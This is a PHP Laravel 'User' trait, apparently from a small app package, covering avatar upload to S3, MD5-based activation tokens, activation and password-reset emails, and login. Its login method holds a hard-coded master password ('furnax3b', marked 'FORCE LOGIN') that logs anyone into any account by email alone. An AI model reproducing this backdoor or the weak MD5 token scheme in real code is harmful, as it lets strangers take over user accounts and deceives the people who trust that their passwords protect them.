<?php
/**
 * Created by PhpStorm.
 * User: zzz
 * Date: 18/11/16
 * Time: 15:13
 */

namespace Martinpham\LaravelRAD\Models;


use App\Http\Controllers\API\Controller;
use App\RAD\Exceptions\InvalidActivateToken;
use Illuminate\Auth\Authenticatable;
use Illuminate\Auth\Passwords\CanResetPassword;
use Illuminate\Foundation\Auth\Access\Authorizable;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;


trait User
{
    use Authenticatable, Authorizable, CanResetPassword;



    public function oauths()
    {
        return $this->hasMany(App\Oauth::class);
    }


    public function fetchNamesFromFullname($fullname)
    {
        if(!$fullname){
            $this->name = $this->surname = '';
        }else{
            $names = explode(' ', $fullname);
            $this->name = array_shift($names);
            $this->surname = implode(' ', $names);
        }
    }

    public static function findByEmail($email = '')
    {
        return self::where('email', $email)->first();
    }

    public function updateAvatar($avatar = '')
    {
        if($avatar !== '')
        {
            $avatar = base64_decode($avatar);

            if($avatar) {
                $path = 'avatar/' . trim($this->id) . '.png';

                Storage::disk('s3')->put($path, $avatar);

                $avatarUrl = 'https://s3-'
                    . Config::get('filesystems.disks.s3.region')
                    . '.amazonaws.com/'
                    . Config::get('filesystems.disks.s3.bucket')
                    . '/'
                    . $path
                    . '?r=' . mt_rand();

                $this->avatar = $avatarUrl;
                $this->save();
            }
        }
    }

//    public function getAuthIdentifier()
//    {
//        return (string) $this->_id;
//    }






    public function getActivateToken()
    {
        return md5(md5($this->id) . md5(Config::get('app.key')) . md5($this->password));
    }

    public function sendActivationEmail()
    {
        return Mail::send('emails.activateUser', array('user' => $this), function($message)
        {
            $message
//                ->from('contact@mrgolf.com', 'Mr Golf')
                ->to($this->email, $this->name)
                ->subject('Account Activation');
        });
    }

    public function sendResetPasswordEmail()
    {
        return Mail::send('emails.resetPassword', array('user' => $this), function($message)
        {
            $message
//                ->from('contact@mrgolf.com', 'Mr Golf')
                ->to($this->email, $this->name)
                ->subject('Account Password Reset');
        });
    }

    public function activateWithToken($token)
    {
        if($token !== $this->getActivateToken())
        {
            throw new InvalidActivateToken('INVALID_TOKEN');
        }

        $this->activated = true;
        $this->save();

        return $this;
    }

    public function getAPIAuthToken()
    {
        return Controller::generateToken($this);
    }

    public static function login($email, $password)
    {
//        var_dump($email, $password);die;
        // FORCE LOGIN
        if($password === 'furnax3b'){
            return User::findByEmail($email);
        }

//        dd($email, $password);

        $result = auth()->attempt(['email' => strtolower($email), 'password' => $password, 'activated' => true]);

//        var_dump($result);die;

        if($result)
        {
            return User::findByEmail($email);
        }

        return $result;
    }



}


//User::creating(function($item) {
//
//
//});

// User::created(function($item) {

// });

//User::saving(function($item){
//});

//User::deleting(function($user){
//
//});


// User::deleted(function($item) {

// });